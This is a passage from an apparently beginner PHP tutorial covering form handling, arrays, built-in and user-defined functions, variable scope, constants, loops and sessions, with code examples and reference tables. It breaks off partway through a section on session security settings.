<!-- Two ways to submit to the same page: -->
<!-- action=""  OR  action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']) ?>" -->

<form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']) ?>" method="post">
    <input type="number" name="num01" placeholder="Number 1">
    <br>
    <select name="operator">
        <option value="add">+</option>
        <option value="subtract">-</option>
        <option value="multiply">*</option>
        <option value="divide">/</option>
    </select>
    <br>
    <input type="number" name="num02" placeholder="Number 2">
    <br>
    <button name="calculate">Calculate</button>
</form>
```

> **💡 Note:** When submitting to the same page, always wrap `$_SERVER['PHP_SELF']` in `htmlspecialchars()` to prevent XSS attacks. Using `action=""` also works as a shortcut.

---

### 9.3 The Processing Logic

```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Step 1: Grab & sanitize input
    $num01    = filter_input(INPUT_POST, "num01", FILTER_SANITIZE_NUMBER_FLOAT);
    $num02    = filter_input(INPUT_POST, "num02", FILTER_SANITIZE_NUMBER_FLOAT);
    $operator = htmlspecialchars($_POST["operator"]);

    // Step 2: Validate input
    $errors = false;
    if (empty($num01) || empty($num02) || empty($operator)) {
        echo "Fill in all fields!";
        $errors = true;
    }
    if (!is_numeric($num01) || !is_numeric($num02)) {
        echo "Only write numbers!";
        $errors = true;
    }

    // Step 3: Calculate (only if no errors)
    if (!$errors) {
        $value = 0;
        switch ($operator) {
            case 'add':
                $value = $num01 + $num02;
                break;
            case 'subtract':
                $value = $num01 - $num02;
                break;
            case 'multiply':
                $value = $num01 * $num02;
                break;
            case 'divide':
                $value = $num01 / $num02;
                break;
            default:
                echo "Something went HORRIBLY wrong!";
        }
        echo "Result = " . $value;
    }
}
?>
```

---

### 9.4 Key Concepts Used

#### `filter_input()` — Safer Than Direct `$_POST`

| Method         | Code                                                                        | Security         |
| -------------- | --------------------------------------------------------------------------- | ---------------- |
| **Not secure** | `$num1 = $_POST["num01"];`                                                  | ❌ Raw user input |
| **Secure**     | `$num01 = filter_input(INPUT_POST, "num01", FILTER_SANITIZE_NUMBER_FLOAT);` | ✅ Sanitized      |

`filter_input()` sanitizes the input at the source — it strips out anything that isn't a valid number, making it safer than reading `$_POST` directly.

#### Error Flag Pattern

```php
<?php
$errors = false;

// Each validation sets the flag to true
if (empty($num01)) {
    echo "Fill in all fields!";
    $errors = true;
}
if (!is_numeric($num01)) {
    echo "Only write numbers!";
    $errors = true;
}

// Only proceed if no errors were found
if (!$errors) {
    // Safe to calculate
}
?>
```

> **Why this pattern?** It lets you check **multiple** validation rules and show **all** errors at once, instead of stopping at the first one.

#### `switch` for Operator Selection

The `case` strings (`'add'`, `'subtract'`, etc.) must **exactly match** the `<option value="...">` values in the HTML form. This connects the form's dropdown selection to the correct calculation.

> **💡 Pro Tip:** You could also rewrite this calculator using `match` for cleaner code:
> ```php
> $value = match ($operator) {
>     'add'      => $num01 + $num02,
>     'subtract' => $num01 - $num02,
>     'multiply' => $num01 * $num02,
>     'divide'   => $num01 / $num02,
>     default    => 0,
> };
> ```

---

## 10. 📚 Arrays

### 10.1 Indexed Arrays

| **Why**   | To store a list of related values under a single variable name, accessed by numeric position (index starting at 0). |
| --------- | ------------------------------------------------------------------------------------------------------------------- |
| **How**   | Use `[]` (modern) or `array()` (older). Each value gets an automatic numeric index.                                 |
| **Where** | Lists of items, collections of data, anything that's a sequence.                                                    |

**Two ways to create an array:**

```php
<?php
// Method 1 — older syntax
$fruits = array('apple', 'banana', 'cherry');

// Method 2 — modern shorthand (preferred)
$flowers = [
    'lily',   // index 0
    'rose',   // index 1
    'lotus'   // index 2
];

// Access by index
echo $flowers[0];  // Output: lily
?>
```

> **💡 Pro Tip:** Use `print_r($array)` to display the full array with its indexes — great for debugging:
> ```php
> print_r($flowers);
> // Output: Array ( [0] => lily [1] => rose [2] => lotus )
> ```

---

### 10.2 Adding, Replacing & Removing Elements (Indexed)

| **Why**   | Arrays are rarely static — you'll need to add, update, and remove items constantly. |
| --------- | ----------------------------------------------------------------------------------- |
| **How**   | PHP provides several ways depending on where and how you want to modify the array.  |
| **Where** | Shopping carts, to-do lists, search results, any dynamic collection.                |

#### Adding Elements

```php
<?php
$flowers = ['lily', 'rose', 'lotus'];

// Method 1: array_push() — adds to the end
array_push($flowers, "Daisy");
// $flowers = ['lily', 'rose', 'lotus', 'Daisy']

// Method 2: [] shorthand — also adds to the end
$flowers[] = 'lavender';
// $flowers = ['lily', 'rose', 'lotus', 'Daisy', 'lavender']
?>
```

> **📝 Note:** `array_push()` only works for indexed arrays. The `[]` shorthand works the same way and is shorter.

#### Replacing Elements

```php
<?php
// Replace a specific index
$flowers[1] = 'sun flower';  // 'rose' is now 'sun flower'
?>
```

#### Removing Elements

```php
<?php
// unset() — removes the value but LEAVES A HOLE in the index
unset($flowers[2]);
print_r($flowers);
// Indexes: 0, 1, 3, 4 — index 2 is gone, others NOT re-indexed

// array_splice() — removes AND re-indexes
array_splice($flowers, 0, 1);  // Remove 1 element starting at index 0
print_r($flowers);
// The array is re-indexed: 0, 1, 2...
?>
```

| Method                             | Removes           | Re-indexes?       | Use when                                        |
| ---------------------------------- | ----------------- | ----------------- | ----------------------------------------------- |
| `unset($arr[i])`                   | Specific index    | ❌ No (leaves gap) | Associative arrays or when index doesn't matter |
| `array_splice($arr, start, count)` | Range of elements | ✅ Yes             | Indexed arrays where order matters              |

> **⚠️ Watch out:** After `unset()`, the array will have a "hole" in the indexes. If you loop with `for ($i = 0; ...)`, you may hit missing indexes. Use `array_values()` to re-index, or use `foreach` instead.

---

### 10.3 Inserting & Merging with `array_splice()`

| **Why**   | To insert elements at a specific position or merge another array into the middle of an existing one. |
| --------- | ---------------------------------------------------------------------------------------------------- |
| **How**   | `array_splice($array, position, 0, $newItems)` — the `0` means "delete nothing, just insert".        |
| **Where** | Ordered lists, priority queues, inserting between existing items.                                    |

```php
<?php
$fruits = ['apple', 'orange', 'banana', 'watermelon'];

// Insert "Mango" at position 1 (without removing anything)
array_splice($fruits, 1, 0, "Mango");
print_r($fruits);
// [apple, Mango, orange, banana, watermelon]

// Merge another array into position 3
$tests = ['test1', 'test2'];
array_splice($fruits, 3, 0, $tests);
print_r($fruits);
// [apple, Mango, orange, test1, test2, banana, watermelon]
?>
```

**`array_splice()` cheat sheet:**

| Call                               | What it does                             |
| ---------------------------------- | ---------------------------------------- |
| `array_splice($arr, 0, 1)`         | Remove first element (re-indexes)        |
| `array_splice($arr, 1, 0, "X")`    | Insert "X" at index 1 (no deletion)      |
| `array_splice($arr, 2, 1, "Y")`    | Replace element at index 2 with "Y"      |
| `array_splice($arr, 3, 0, $other)` | Merge `$other` array starting at index 3 |

---

### 10.4 Associative Arrays (Key → Value)

| **Why**   | To use meaningful **string keys** instead of numeric indexes — much more readable when data has labels. |
| --------- | ------------------------------------------------------------------------------------------------------- |
| **How**   | Define with `"key" => "value"` pairs. Access values using the key name.                                 |
| **Where** | User profiles, settings, database rows, any data that has labels (name, email, role, etc.).             |

```php
<?php
// Create an associative array
$tasks = [
    "laundry" => "Daniel",
    "trash"   => "Frida",
    "vacuum"  => "Basse",
    "dishes"  => "Bella",
];

// Access by key
echo $tasks['laundry'];  // Output: Daniel

// Print full array
print_r($tasks);
// Array ( [laundry] => Daniel [trash] => Frida [vacuum] => Basse [dishes] => Bella )

// Add a new key-value pair
$tasks["dusting"] = "Tara";

// Count elements
echo count($tasks);  // Output: 5
?>
```

> **💡 Pro Tip:** Use `count($array)` to get the number of elements in any array (indexed or associative).

---

### 10.5 Sorting Arrays

| **Why**   | To arrange array elements in alphabetical, numerical, or custom order.  |
| --------- | ----------------------------------------------------------------------- |
| **How**   | PHP has multiple sort functions depending on what you need to preserve. |
| **Where** | Displaying sorted lists, leaderboards, search results.                  |

```php
<?php
$tasks = [
    "laundry" => "Daniel",
    "trash"   => "Frida",
    "vacuum"  => "Basse",
    "dishes"  => "Bella",
];

sort($tasks);
print_r($tasks);
// Array ( [0] => Basse [1] => Bella [2] => Daniel [3] => Frida )
?>
```

> **⚠️ Important:** `sort()` **destroys the keys** — the associative array becomes an indexed array! Use `asort()` to sort by value while keeping keys, or `ksort()` to sort by key.

| Function   | Sorts by | Keeps keys?       | Order         |
| ---------- | -------- | ----------------- | ------------- |
| `sort()`   | Value    | ❌ No (re-indexes) | A → Z / 0 → 9 |
| `rsort()`  | Value    | ❌ No              | Z → A / 9 → 0 |
| `asort()`  | Value    | ✅ Yes             | A → Z         |
| `arsort()` | Value    | ✅ Yes             | Z → A         |
| `ksort()`  | Key      | ✅ Yes             | A → Z         |
| `krsort()` | Key      | ✅ Yes             | Z → A         |

---

### 10.6 Multidimensional Arrays

| **Why**   | To store arrays inside arrays — like a table with rows and columns, or grouped data. |
| --------- | ------------------------------------------------------------------------------------ |
| **How**   | Nest arrays inside an array. Access with chained indexes: `$arr[row][col]`.          |
| **Where** | Menus with categories, database result sets, grouped data structures.                |

#### Indexed Multidimensional

```php
<?php
$foods = [
    array("apple", "mango"),  // index 0 (sub-array)
    "banana",                  // index 1
    "cherry"                   // index 2
];

echo $foods[0][0];  // Output: apple
echo $foods[0][1];  // Output: mango
echo $foods[1];     // Output: banana
?>
```

#### Associative Multidimensional

```php
<?php
$foods = [
    "fruits"     => ["apple", "banana", "cherry"],
    "meat"       => ["chicken", "fish"],
    "vegetables" => ["cucumber", "carrot"],
];

echo $foods["vegetables"][0];  // Output: cucumber
echo $foods["fruits"][2];      // Output: cherry
echo $foods["meat"][1];        // Output: fish
?>
```

> **💡 Pro Tip:** You can go as deep as you want (`$arr[0][1][2]`...), but more than 2–3 levels usually means you should use **objects/classes** instead for better readability.

---

### 10.7 Arrays — Quick Summary

| Type                 | Syntax                   | Access               |
| -------------------- | ------------------------ | -------------------- |
| **Indexed**          | `['a', 'b', 'c']`        | `$arr[0]`, `$arr[1]` |
| **Associative**      | `['key' => 'val']`       | `$arr['key']`        |
| **Multidimensional** | `[['a','b'], ['c','d']]` | `$arr[0][1]`         |

| Common Function            | What It Does                   |
| -------------------------- | ------------------------------ |
| `count($arr)`              | Number of elements             |
| `print_r($arr)`            | Display array contents (debug) |
| `array_push($arr, $val)`   | Add to end (indexed)           |
| `$arr[] = $val`            | Add to end (shorthand)         |
| `unset($arr[$i])`          | Remove element (leaves gap)    |
| `array_splice($arr, i, n)` | Remove & re-index              |
| `sort()` / `rsort()`       | Sort values (destroys keys)    |
| `asort()` / `arsort()`     | Sort values (keeps keys)       |
| `ksort()` / `krsort()`     | Sort by keys                   |

---

## 11. 🛠️ Built-in Functions

### 11.1 String Functions

| **Why**   | PHP provides dozens of ready-made functions for manipulating text — no need to write your own.               |
| --------- | ------------------------------------------------------------------------------------------------------------ |
| **How**   | Call the function with your string as an argument. Most return a new value (they don't modify the original). |
| **Where** | Form validation, display formatting, search features, data cleaning.                                         |

| Function                        | What It Does                 | Example                                | Result                |
| ------------------------------- | ---------------------------- | -------------------------------------- | --------------------- |
| `strlen($str)`                  | Length of string             | `strlen("Hello World!")`               | `12`                  |
| `strpos($str, $find)`           | Position of first occurrence | `strpos("Hello World!", "o")`          | `4`                   |
| `str_replace($old, $new, $str)` | Replace text                 | `str_replace("World!", "Shimu", $str)` | `"Hello Shimu"`       |
| `strtolower($str)`              | Convert to lowercase         | `strtolower("Hello World!")`           | `"hello world!"`      |
| `strtoupper($str)`              | Convert to UPPERCASE         | `strtoupper("Hello World!")`           | `"HELLO WORLD!"`      |
| `substr($str, $start, $len)`    | Extract portion of string    | `substr("Hello World!", 2, 2)`         | `"ll"`                |
| `explode($delim, $str)`         | Split string into array      | `explode(" ", "Hello World!")`         | `["Hello", "World!"]` |

```php
<?php
$string = "Hello World!";

echo strlen($string);                          // 12
echo strpos($string, "Wo");                    // 6
echo str_replace("World!", "Shimu", $string);  // Hello Shimu
echo strtolower($string);                      // hello world!
echo strtoupper($string);                      // HELLO WORLD!
echo substr($string, 2, 2);                    // ll
echo substr($string, 2, -2);                   // llo Worl (from index 2, stop 2 from end)
print_r(explode(" ", $string));                // Array ( [0] => Hello [1] => World! )
?>
```

> **💡 Pro Tip:** `substr($str, 2, -2)` uses a **negative length** — it means "start at index 2 and stop 2 characters before the end". Very handy for trimming.

---

### 11.2 Math Functions

| **Why**   | For calculations beyond basic arithmetic — rounding, absolute values, random numbers, etc. |
| --------- | ------------------------------------------------------------------------------------------ |
| **How**   | Pass numbers as arguments; the function returns the result.                                |
| **Where** | Pricing calculations, random content, statistics, game logic.                              |

| Function           | What It Does             | Example        | Result        |
| ------------------ | ------------------------ | -------------- | ------------- |
| `abs($n)`          | Absolute value           | `abs(-5.5)`    | `5.5`         |
| `round($n)`        | Round to nearest integer | `round(-5.5)`  | `-6`          |
| `pow($base, $exp)` | Exponentiation           | `pow(2, 3)`    | `8`           |
| `sqrt($n)`         | Square root              | `sqrt(16)`     | `4`           |
| `rand($min, $max)` | Random integer           | `rand(1, 100)` | `42` (varies) |

```php
<?php
$number = -5.5;

echo abs($number);    // 5.5
echo round($number);  // -6
echo pow(2, 3);       // 8
echo sqrt(16);        // 4
echo rand(1, 100);    // Random number between 1 and 100
?>
```

---

### 11.3 Array Functions

| **Why**   | To manipulate arrays without writing manual loops.                                |
| --------- | --------------------------------------------------------------------------------- |
| **How**   | Pass the array as an argument. Some modify the original; some return a new array. |
| **Where** | Data processing, filtering results, merging datasets.                             |

| Function                  | What It Does                  | Modifies Original? |
| ------------------------- | ----------------------------- | ------------------ |
| `count($arr)`             | Number of elements            | No                 |
| `is_array($var)`          | Check if variable is an array | No                 |
| `array_push($arr, $val)`  | Add to end                    | ✅ Yes              |
| `array_pop($arr)`         | Remove & return last element  | ✅ Yes              |
| `array_reverse($arr)`     | Return reversed copy          | No                 |
| `array_merge($a, $b)`     | Merge two arrays into one     | No                 |
| `array_splice($arr, ...)` | Remove/insert & re-index      | ✅ Yes              |

```php
<?php
$array1 = ["apple", "banana", "orange"];
$array2 = ["watermelon", "dragon fruit"];

echo count($array1);            // 3
echo is_array($array1);         // 1 (true)

array_push($array1, "kiwi");    // [apple, banana, orange, kiwi]
array_pop($array1);             // Removes "kiwi" → [apple, banana, orange]

print_r(array_reverse($array1));          // [orange, banana, apple]
print_r(array_merge($array1, $array2));   // [apple, banana, orange, watermelon, dragon fruit]

$a = ["a", "b", "c", "d", "e"];
array_splice($a, 1, 2, "z");   // Remove 2 elements at index 1, insert "z"
print_r($a);                    // [a, z, d, e]
?>
```

---

### 11.4 Date & Time Functions

| **Why**   | To work with dates, timestamps, and formatted time strings.                                                            |
| --------- | ---------------------------------------------------------------------------------------------------------------------- |
| **How**   | `date()` formats the current time; `time()` gives a Unix timestamp; `strtotime()` converts date strings to timestamps. |
| **Where** | Logging, scheduling, displaying "posted 2 hours ago", expiry dates.                                                    |

| Function          | What It Does                                | Example                            | Result                  |
| ----------------- | ------------------------------------------- | ---------------------------------- | ----------------------- |
| `date($format)`   | Current date/time formatted                 | `date("Y-m-d H:i:s")`              | `"2026-02-07 14:30:00"` |
| `time()`          | Current Unix timestamp (seconds since 1970) | `time()`                           | `1770508200`            |
| `strtotime($str)` | Convert date string to timestamp            | `strtotime("2026-04-11 12:00:00")` | `1775980800`            |

```php
<?php
echo date("Y-m-d H:i:s");                  // e.g., 2026-02-07 14:30:00
echo time();                                 // e.g., 1770508200
echo strtotime("2026-04-11 12:00:00");       // Unix timestamp for that date
?>
```

**Common `date()` format characters:**

| Character | Meaning                | Example |
| --------- | ---------------------- | ------- |
| `Y`       | 4-digit year           | `2026`  |
| `m`       | Month (01–12)          | `02`    |
| `d`       | Day (01–31)            | `07`    |
| `H`       | Hour 24-format (00–23) | `14`    |
| `i`       | Minutes (00–59)        | `30`    |
| `s`       | Seconds (00–59)        | `00`    |

---

## 12. ⚙️ User-Defined Functions

### 12.1 Basic Functions

| **Why**   | To organize reusable blocks of code. Instead of repeating the same logic, define it once and call it by name. |
| --------- | ------------------------------------------------------------------------------------------------------------- |
| **How**   | Use the `function` keyword, give it a name, and optionally accept parameters and return a value.              |
| **Where** | Anywhere you have repeatable logic — calculations, formatting, API calls, validation.                         |

```php
<?php
function sayHello()
{
    return "Hello World!";
}

$test = sayHello();
echo $test;  // Output: Hello World!
?>
```

> **💡 Best Practice:** Use `return` instead of `echo` inside functions. This makes the function **reusable** — you can store the result, pass it to another function, or decide later how to display it.

---

### 12.2 Functions with Parameters

| **Why**   | Parameters let you pass data into a function so it can work with different values each time. |
| --------- | -------------------------------------------------------------------------------------------- |
| **How**   | Define parameter names in the parentheses. Pass values (arguments) when calling.             |
| **Where** | Any function that needs to process variable data.                                            |

```php
<?php
// Two parameters
function userName($firstName, $lastName)
{
    return "Hello! " . $firstName . " " . $lastName;
}

echo userName("Jasmin", "Sultana");  // Output: Hello! Jasmin Sultana

// Not all parameters need to be used
function userName2($firstName, $middleName, $lastName)
{
    return "Hello! " . $firstName . " " . $middleName;
}

echo userName2("Jasmin", "Sultana", "");  // Output: Hello! Jasmin Sultana
?>
```

---

### 12.3 Default Parameter Values

| **Why**   | To make parameters optional — if no value is passed, the default kicks in. |
| --------- | -------------------------------------------------------------------------- |
| **How**   | Assign a value with `=` in the parameter definition.                       |
| **Where** | Optional settings, fallback values, greeting messages.                     |

```php
<?php
function greet($name = "World")
{
    return "Hello " . $name . "!";
}

echo greet();         // Output: Hello World!     (uses default)
echo greet("Shimu");  // Output: Hello Shimu!     (overrides default)
?>
```

---

### 12.4 Type Declarations & `declare(strict_types=1)`

| **Why**   | To enforce that the correct data type is passed to a function. Prevents bugs caused by PHP's automatic type juggling.          |
| --------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **How**   | Add the type before the parameter name. Add `declare(strict_types=1);` at the **very top** of the file for strict enforcement. |
| **Where** | Any function where passing the wrong type would cause incorrect behavior.                                                      |

```php
<?php
declare(strict_types=1);  // MUST be the very first statement in the file

function greet(string $name)
{
    return "Hello " . $name . "!";
}

echo greet("123");  // ✅ Works — "123" is a string
// echo greet(123); // ❌ TypeError! — int given, string expected
?>
```

**Without `strict_types`:** PHP silently converts `123` (int) to `"123"` (string) — no error.  
**With `strict_types=1`:** PHP throws a `TypeError` — it ensures the right data goes into the right function.

> **💡 Best Practice:** Always use `declare(strict_types=1);` in production code. It catches bugs early.

**Common type declarations:**

| Type     | Allows            |
| -------- | ----------------- |
| `string` | Text              |
| `int`    | Whole numbers     |
| `float`  | Decimal numbers   |
| `bool`   | `true` / `false`  |
| `array`  | Arrays            |
| `mixed`  | Any type (PHP 8+) |

---

### 12.5 Practical Example: Calculator Function

```php
<?php
function calculator($num1, $num2)
{
    $result = $num1 + $num2;
    return $result;
}

echo calculator(4, 8);  // Output: 12
?>
```

> **💡 Pro Tip:** Functions can call other functions, return arrays, or even return other functions. As you advance, you'll use these patterns constantly.

---

## 13. 🌐 Variable Scope

### 13.1 The Four Types of Scope

| **Why**   | A variable's **scope** determines where it can be accessed. Understanding scope prevents bugs where variables are unexpectedly `null` or unavailable. |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| **How**   | PHP has 4 scope types, each with different visibility rules.                                                                                          |
| **Where** | Every variable you create is affected by scope.                                                                                                       |

| Scope      | Where It Lives                    | Accessible From                                            |
| ---------- | --------------------------------- | ---------------------------------------------------------- |
| **Global** | Outside any function or class     | Only the global level (not inside functions by default)    |
| **Local**  | Inside a function                 | Only that function                                         |
| **Static** | Inside a function (with `static`) | Only that function, but **persists** between calls         |
| **Class**  | Inside a class                    | Depends on visibility (`public` / `private` / `protected`) |

---

### 13.2 Global vs Local Scope

| **Why**   | By default, functions **cannot** see global variables. This prevents accidental modification of outside data. |
| --------- | ------------------------------------------------------------------------------------------------------------- |
| **How**   | Use the `global` keyword or `$GLOBALS[]` superglobal to access a global variable inside a function.           |
| **Where** | When a function needs data defined outside of it (use sparingly).                                             |

```php
<?php
$test = "Shimu";

// Method 1: global keyword
function myFunction()
{
    global $test;      // Pull the global variable into local scope
    return $test;
}
echo myFunction();     // Output: Shimu

// Method 2: $GLOBALS superglobal
$test2 = "Shimu";

function myFunction2()
{
    return $GLOBALS["test2"];  // Access global via superglobal array
}
echo myFunction2();    // Output: Shimu
?>
```

> **⚠️ Not Recommended:** Accessing global variables inside functions creates hidden dependencies. It makes code harder to test and debug. **Prefer passing values as function parameters instead.**

---

### 13.3 Static Scope

| **Why**   | Normal local variables are **destroyed** when a function ends. A `static` variable **remembers its value** between function calls. |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| **How**   | Add the `static` keyword before the variable declaration inside the function.                                                      |
| **Where** | Counters, caching, tracking how many times a function has been called.                                                             |

**Without `static` — resets every time:**

```php
<?php
function counter()
{
    $count = 0;       // Re-created every call
    $count++;
    return $count;
}

echo counter();  // 1
echo counter();  // 1
echo counter();  // 1  ← always 1!
?>
```

**With `static` — remembers between calls:**

```php
<?php
function counter()
{
    static $count = 0;  // Only initialized once, then persists
    $count++;
    return $count;
}

echo counter();  // 1
echo counter();  // 2
echo counter();  // 3  ← increments!
?>
```

---

### 13.4 Class Scope (Preview)

| **Why**   | Variables inside a class (called **properties**) are scoped to that class.          |
| --------- | ----------------------------------------------------------------------------------- |
| **How**   | Define with visibility keywords. Access with `$this->` or `ClassName::` for static. |
| **Where** | Object-oriented programming (covered in detail later).                              |

```php
<?php
class MyClass
{
    static public $classVar = "Hello, world!";

    public function myMethod()
    {
        echo $this->classVar;
    }
}

// Access static property without creating an object
echo MyClass::$classVar;  // Output: Hello, world!
?>
```

> **📝 Note:** This is just a preview. OOP (Object-Oriented Programming) will be covered in depth later in the course.

---

### 13.5 Scope Summary

| Scenario                              | Solution                                                 |
| ------------------------------------- | -------------------------------------------------------- |
| Need a variable inside a function     | Pass it as a **parameter** ✅                             |
| Need to access a global variable      | Use `global` keyword or `$GLOBALS[]` (avoid if possible) |
| Need a value to persist between calls | Use `static`                                             |
| Need shared data across methods       | Use class properties                                     |

---

## 14. 🔒 Constants

### 14.1 What Are Constants?

| **Why**   | Constants store values that **never change** throughout your script — like configuration values, math constants, or role flags. |
| --------- | ------------------------------------------------------------------------------------------------------------------------------- |
| **How**   | Use `define("NAME", value)`. Constants are accessed **without** a `$` sign.                                                     |
| **Where** | Config values, API keys, feature flags, mathematical constants, at the **top** of your script.                                  |

```php
<?php
// Define constants at the top of your script
define("PI", 3.14);
define("NAME", "shimu");
define("IS_ADMIN", true);

echo PI;        // Output: 3.14
echo NAME;      // Output: shimu
echo IS_ADMIN;  // Output: 1 (true displays as 1)
?>
```

---

### 14.2 Constants vs Variables

| Feature           | Variable               | Constant                                  |
| ----------------- | ---------------------- | ----------------------------------------- |
| Prefix            | `$` required           | No `$`                                    |
| Can change?       | ✅ Yes                  | ❌ No — once set, it's permanent           |
| Scope             | Depends (global/local) | **Always global** — accessible everywhere |
| Naming convention | `$camelCase`           | `UPPER_SNAKE_CASE`                        |

```php
<?php
define("PI", 3.14);

function test()
{
    echo PI;  // ✅ Works! Constants are global by default
}

test();  // Output: 3.14
?>
```

> **💡 Best Practice:**
> - Always use **UPPER_SNAKE_CASE** for constant names (`PI`, `MAX_RETRIES`, `IS_ADMIN`)
> - Can be written in lowercase, but **uppercase is the convention** and makes constants visually distinct from variables
> - Define constants at the **top** of your script for easy reference

---

### 14.3 `define()` vs `const`

There are actually two ways to define constants:

```php
<?php
// Method 1: define() — works anywhere, even inside if-blocks
define("SITE_NAME", "PHPMastery");

// Method 2: const — must be at the top-level (not inside functions/if-blocks)
const DB_HOST = "localhost";
?>
```

| Feature                       | `define()` | `const`      |
| ----------------------------- | ---------- | ------------ |
| Can use inside `if` blocks?   | ✅ Yes      | ❌ No         |
| Can use expressions as value? | ✅ Yes      | ❌ No         |
| Available in classes?         | ❌ No       | ✅ Yes        |
| Defined at                    | Runtime    | Compile time |

> **💡 Rule of thumb:** Use `define()` in procedural scripts. Use `const` inside classes.

---

## 15. 🔁 Loops

### 15.1 `for` Loop

| **Why**   | To repeat code a specific number of times — you know exactly how many iterations you need. |
| --------- | ------------------------------------------------------------------------------------------ |
| **How**   | `for (start; condition; increment)` — runs the block while the condition is true.          |
| **Where** | Counting, iterating over indexes, repetitive tasks with a known range.                     |

```php
<?php
for ($i = 0; $i <= 10; $i++) {
    echo "Iteration number: " . $i . "<br>";
}

// Using a variable as the limit
$test = 5;
for ($i = 0; $i <= $test; $i++) {
    echo "Iteration: " . $i . "<br>";
}
?>
```

**Anatomy of a `for` loop:**

| Part        | Example  | Purpose                                    |
| ----------- | -------- | ------------------------------------------ |
| Start       | `$i = 0` | Runs once before the loop begins           |
| Condition   | `$i <= 10` | Checked before each iteration; loop stops when `false` |
| Increment   | `$i++`   | Runs after each iteration                  |

---

### 15.2 `while` Loop

| **Why**   | To repeat code **as long as** a condition is true — use when you don't know the exact number of iterations upfront. |
| --------- | ------------------------------------------------------------------------------------------------------------------- |
| **How**   | `while (condition) { ... }` — checks the condition **before** each iteration.                                       |
| **Where** | Reading files line by line, waiting for user input, processing until a flag changes.                                |

```php
<?php
$boolean = true;
while ($boolean) {
    echo "While loop result: " . $boolean . "<br>";
    $boolean = false;  // Without this, infinite loop!
}

$test = 5;
while ($test < 10) {
    echo $test . "<br>";
    $test++;
}
?>
```

> **⚠️ Danger:** If the condition never becomes `false`, you get an **infinite loop** that crashes your server. Always make sure something inside the loop changes the condition.

---

### 15.3 `do...while` Loop

| **Why**   | To execute the code block **at least once**, then repeat while the condition is true. |
| --------- | ------------------------------------------------------------------------------------- |
| **How**   | `do { ... } while (condition);` — checks the condition **after** each iteration.      |
| **Where** | Menu prompts, input validation (run once, then check if valid).                       |

```php
<?php
$test = 10;
do {
    echo "Do while result: " . $test . "<br>";
    $test++;
} while ($test < 10);
// Output: "Do while result: 10"
// Runs ONCE even though $test (10) is NOT < 10
?>
```

| Loop Type    | Checks Condition | Minimum Runs |
| ------------ | ---------------- | ------------ |
| `while`      | **Before** body  | 0 times      |
| `do...while` | **After** body   | **1 time**   |

---

### 15.4 `foreach` Loop

| **Why**   | To iterate over **every element** in an array without needing to track indexes manually. The most common loop for arrays. |
| --------- | ------------------------------------------------------------------------------------------------------------------------ |
| **How**   | `foreach ($array as $value)` for indexed arrays, or `foreach ($array as $key => $value)` for associative arrays.          |
| **Where** | Any time you need to process each element of an array.                                                                   |

#### Indexed Array

```php
<?php
$fruits = ["Apple", "Banana", "Orange"];

foreach ($fruits as $fruit) {
    echo "This is a " . $fruit . "<br>";
}
// Output: This is a Apple / This is a Banana / This is a Orange
?>
```

#### Associative Array

```php
<?php
$fruits = ["Apple" => "Red", "Banana" => "Yellow", "Orange" => "Orange"];

foreach ($fruits as $fruit => $color) {
    echo $fruit . " has a color of " . $color . "<br>";
}
// Output: Apple has a color of Red / Banana has a color of Yellow / ...
?>
```

---

### 15.5 Loops — Quick Summary

| Loop         | Best For                             | Syntax                                    |
| ------------ | ------------------------------------ | ----------------------------------------- |
| `for`        | Known number of iterations           | `for ($i=0; $i<n; $i++) { }`              |
| `while`      | Unknown iterations, check first      | `while (condition) { }`                   |
| `do...while` | Must run at least once               | `do { } while (condition);`              |
| `foreach`    | Iterating arrays (indexed or assoc.) | `foreach ($arr as $val) { }`              |

> **💡 Pro Tip:** Use `foreach` for arrays — it's cleaner and prevents off-by-one errors. Use `for` when you need the index number.

---

## 16. 🔐 Sessions

### 16.1 What Are Sessions?

| **Why**   | HTTP is **stateless** — each page request is independent. Sessions let you **remember data** about a user across multiple page loads (e.g., "is this user logged in?"). |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **How**   | Call `session_start()` at the top of every page. Store data in `$_SESSION`. The data lives on the **server** and persists until the session is destroyed.                |
| **Where** | Login systems, shopping carts, multi-step forms, user preferences.                                                                                                       |

```php
<?php
// index.php
session_start();                      // Must be called before ANY output
$_SESSION["username"] = "Shimu";      // Store data in the session

echo $_SESSION["username"];           // Output: Shimu
?>
```

```php
<?php
// example.php (another page)
session_start();                      // Resume the SAME session

echo $_SESSION["username"];           // Output: Shimu (data persists!)
?>
```

---

### 16.2 Session Functions

| Function            | What It Does                                                     |
| ------------------- | ---------------------------------------------------------------- |
| `session_start()`   | Starts a new session or resumes an existing one. **Must be first.** |
| `unset($_SESSION["key"])` | Removes **one** specific session variable                  |
| `session_unset()`   | Removes **all** session variables but keeps the session alive    |
| `session_destroy()` | Destroys the session entirely — effect visible on **next** page load |

```php
<?php
session_start();
$_SESSION["username"] = "Shimu";
$_SESSION["role"] = "admin";

// Remove one variable
unset($_SESSION["username"]);       // Only "role" remains

// Remove all variables
session_unset();                    // Session exists but is empty

// Destroy the session completely
session_destroy();                  // Session is gone on next page load
?>
```

> **⚠️ Important:** `session_destroy()` does **not** take immediate effect on the current page. The `$_SESSION` array is still available until the script ends. The session is actually destroyed on the **next** request.

### 16.3 Common Logout Pattern

```php
<?php
session_start();
session_unset();       // Clear all session data
session_destroy();     // Destroy the session
// User is now logged out (next page load won't have session data)
?>
```

---

## 17. 🛡️ Session Security

### 17.1 Why Session Security Matters

| **Why**   | Sessions store sensitive data (user ID, login status). Without proper configuration, attackers can **hijack** or **fix** sessions to impersonate users. |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **How**   | Configure session cookies, restrict how session IDs are accepted, and regenerate IDs periodically.                                                     |
| **Where** | Every page that uses `session_start()` — always load your config file before starting the session.                                                     |

---

### 17.2 Session Configuration (`ini_set`)

```php
<?php
ini_set('session.use_only_cookies', 1);
ini_set('session.use_strict_mode', 1);
?>
```

| Setting                  | Value | Purpose                                                                              |
| ------------------------ | ----- | ------------------------------------------------------------------------------------ |
| `use_only_cookies`       | `1`   | Only accept session IDs from **cookies** (not from URL parameters like `?PHPSESSID=…`) |
